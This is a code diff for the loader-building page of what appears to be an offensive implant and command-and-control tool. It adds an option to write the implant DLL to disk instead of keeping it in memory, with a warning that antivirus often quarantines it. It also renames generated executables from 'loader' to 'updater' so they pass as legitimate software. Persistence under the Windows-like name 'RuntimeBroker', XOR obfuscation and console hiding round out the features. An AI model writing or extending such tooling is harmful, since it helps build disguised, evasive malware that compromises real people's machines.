@@ -23,6 +23,8 @@ type SavedOpts = {
   xorKey: string
   persistence: string
   persistName: string
+  /** Opt-in: drop plaintext implant DLL next to EXE (AV often quarantines). */
+  diskDll: boolean
 }
 
 const DEFAULTS: SavedOpts = {
@@ -35,6 +37,7 @@ const DEFAULTS: SavedOpts = {
   xorKey: '',
   persistence: 'off',
   persistName: 'RuntimeBroker',
+  diskDll: false,
 }
 
 function loadOpts(): SavedOpts {
@@ -94,7 +97,7 @@ function persistAllowed(os: string, method: string): boolean {
 
 function outName(name: string, os: string): string {
   const base = (name || 'payload').replace(/\.[^.]+$/, '').replace(/[^\w.-]+/g, '_') || 'payload'
-  return os === 'windows' ? `${base}_loader.exe` : `${base}_loader`
+  return os === 'windows' ? `${base}_updater.exe` : `${base}_updater`
 }
 
 async function sha256Hex(buf: ArrayBuffer): Promise<string> {
@@ -365,6 +368,7 @@ export default function LoadersPage() {
         persist_name: opts.persistName,
         xor_key: opts.xorKey.trim() || undefined,
         function_name: opts.functionName.trim() || 'StartW',
+        disk_dll: opts.os === 'windows' && sharedSource ? opts.diskDll : false,
       })
       const bin = base64ToBytes(res.data_b64)
       triggerDownload(res.filename, bin)
@@ -383,8 +387,12 @@ export default function LoadersPage() {
           hash,
         }),
       )
-      if (res.engine === 'mingw-c-dll' && res.dll_filename) {
-        toast.push('success', t('loaders.wrapDownloadedDll', { name: res.dll_filename }))
+      if (res.engine === 'mingw-c-dll') {
+        if (res.dll_data_b64 && res.dll_filename) {
+          toast.push('success', t('loaders.wrapDownloadedDll', { name: res.dll_filename }))
+        } else if (res.dll_filename) {
+          toast.push('success', t('loaders.wrapEmbeddedDll', { name: res.dll_filename }))
+        }
       }
       setLastClean(res.clean || null)
       if (res.clean?.remaining && res.clean.remaining.length > 0) {
@@ -566,7 +574,12 @@ export default function LoadersPage() {
             <p className="muted">
               {t('loaders.sourceHint')} <Link to="/implants">{t('nav.implants')}</Link>
             </p>
-            {sharedSource && opts.os === 'windows' && <p className="warn-hint">{t('loaders.diskDllHint')}</p>}
+            {sharedSource && opts.os === 'windows' && !opts.diskDll && (
+              <p className="warn-hint">{t('loaders.preferShellcode')}</p>
+            )}
+            {sharedSource && opts.os === 'windows' && opts.diskDll && (
+              <p className="warn-hint">{t('loaders.diskDllHint')}</p>
+            )}
             {sharedSource && opts.os !== 'windows' && <p className="muted">{t('loaders.rdiAuto')}</p>}
             {selectedC2s.length > 0 && (
               <div className="c2-cell">
@@ -621,6 +634,24 @@ export default function LoadersPage() {
               </label>
             </div>
             <p className="muted">{t('loaders.hideConsoleHint')}</p>
+            {opts.os === 'windows' && sharedSource && (
+              <>
+                <div className="field check">
+                  <label>
+                    <input
+                      type="checkbox"
+                      checked={opts.diskDll}
+                      onChange={(e) => setOpts((o) => ({ ...o, diskDll: e.target.checked }))}
+                    />
+                    {t('loaders.diskDllOptIn')}
+                  </label>
+                </div>
+                <p className="muted">{t('loaders.diskDllOptInHint')}</p>
+              </>
+            )}
+            {opts.os === 'windows' && !sharedSource && (
+              <p className="muted">{t('loaders.memOverlayHint')}</p>
+            )}
             {opts.hideConsole && (
               <div className="form-actions">
                 <button
@@ -691,7 +722,7 @@ export default function LoadersPage() {
             <p className="muted">{t('loaders.runHint')}</p>
             <p className="muted">{t('loaders.keepAliveHint')}</p>
             <p className="muted">{t('loaders.nativeCHint')}</p>
-            <p className="muted">{t('loaders.diskDllCopy')}</p>
+            <p className="muted">{t(opts.diskDll ? 'loaders.diskDllCopy' : 'loaders.memOverlayCopy')}</p>
             <p className="muted">{t('loaders.cleanHint')}</p>
             {lastClean && (lastClean.replaced?.length || lastClean.remaining?.length) ? (
               <div className="warn-hint">
